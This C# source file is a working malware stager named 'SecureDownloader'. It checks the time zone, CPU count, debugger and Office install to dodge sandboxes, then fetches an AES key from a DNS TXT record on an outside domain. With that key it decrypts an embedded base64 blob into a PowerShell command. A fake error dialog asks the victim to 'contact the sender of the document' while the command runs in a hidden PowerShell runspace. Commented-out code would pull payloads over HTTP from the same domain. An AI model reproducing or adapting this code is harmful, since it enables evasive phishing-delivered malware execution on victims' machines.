using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using Microsoft.Win32;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace SecureDownloader {
    class SandboxCheck {
        private static bool checkTimeZone() {
            if (TimeZone.CurrentTimeZone.StandardName == "Coordinated Universal Time") {
                return false;
            }
            else {
                return true;
            }
        }

        private static bool checkProcessorCount() {
            return System.Environment.ProcessorCount > 1;
        }

        private static bool checkDebugger() {
            return !System.Diagnostics.Debugger.IsAttached;
        }

        private static bool checkOfficeInstall() {
            List<string> EvidenceOfOffice = new List<string>();
            string[] FilePaths = {  @"C:\Program Files\Microsoft Office\Office12\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office12\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office14\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office14\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office15\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office15\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office16\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office16\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office12\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office12\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office14\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office14\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office15\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office15\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office16\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office16\winword.exe"};
            foreach (string FilePath in FilePaths) {
                if (File.Exists(FilePath)) {
                    EvidenceOfOffice.Add(FilePath);
                }
            }

            return EvidenceOfOffice.Count >= 1;
        }

        public static void izSafe() {
            if (!checkTimeZone()) {
                Environment.Exit(0);
            }

            if (!checkProcessorCount()) {
                Environment.Exit(0);
            }

            if (!checkDebugger()) {
                Environment.Exit(0);
            }

            if (!checkOfficeInstall()) {
                Environment.Exit(0);
            }

            return;
        }
    }

    //SharpPick
    class FunStuff {
        public static string DoFunStuff(string cmd) {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results) {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }

    class HelperFunctions {
        // stolen from https://stackoverflow.com/questions/273452/using-aes-encryption-in-c-sharp
        public static string decrypt(byte[] cipherText, byte[] Key, byte[] IV) {
            // Check arguments. 
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold 
            // the decrypted text. 
            string plaintext = null;

            // Create an RijndaelManaged object 
            // with the specified key and IV. 
            using (RijndaelManaged rijAlg = new RijndaelManaged()) {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                // Create a decrytor to perform the stream transform.
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                // Create the streams used for decryption. 
                using (MemoryStream msDecrypt = new MemoryStream(cipherText)) {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt)) {

                            // Read the decrypted bytes from the decrypting stream 
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }

        // stolen fron http://www.robertsindall.co.uk/blog/blog/2011/05/09/getting-dns-txt-record-using-c-sharp/
        public static IList<string> getTXTrecords(string domain) {
            IList<string> txtRecords = new List<string>();
            string output;
            string pattern = string.Format(@"{0}\s*text =\s*""([\w\-\=]*)""", domain);
            var getKey = new ProcessStartInfo("nslookup");
            getKey.Arguments = string.Format("-type=TXT {0}", domain);
            getKey.RedirectStandardOutput = true;
            getKey.UseShellExecute = false;
            getKey.WindowStyle = ProcessWindowStyle.Hidden;
            using (var nslookupProcess = Process.Start(getKey)) {
                output = nslookupProcess.StandardOutput.ReadToEnd();
            }

            var matches = Regex.Matches(output, pattern, RegexOptions.IgnoreCase);
            foreach (Match match in matches) {
                if (match.Success)
                    txtRecords.Add(match.Groups[1].Value);
            }

            return txtRecords;
        }

        // stolen from https://stackoverflow.com/questions/27108264/c-sharp-how-to-properly-make-a-http-web-get-request
        //public static string HttpGet(string URI) {
        //    WebClient client = new WebClient();

        //    //proxy aware
        //    client.UseDefaultCredentials = true;
        //    client.Proxy = WebRequest.GetSystemWebProxy();
        //    client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

        //    Stream data = client.OpenRead(URI);
        //    StreamReader reader = new StreamReader(data);
        //    string s = reader.ReadToEnd();
        //    data.Close();
        //    reader.Close();

        //    return s;
        //}
    }
    
    class Program {
        static void Main() {
            SandboxCheck.izSafe();

            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("ksufmv.concordiafunds.com")[0]);
            //string data;
            //var version = Environment.Version;
            //if (version.Major >= 4) //domain fronting requires .NET 4.0 or higher
            //{
            //    data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/appdata");
            //}
            //else //cant domain front, fetch alternate payload
            //{
            //    data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
            //}
            //Environment.Exit(0);

            //string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/appdata2");
            string data = "G/2OGB4GqbwpdOrh8ft6og==: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";

            byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
            byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);

            string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);
            string decodedCmd = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
            MessageBox.Show("Please contact the sender of the document for authorization.", "An error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
            FunStuff.DoFunStuff(decodedCmd);
        }
    }
}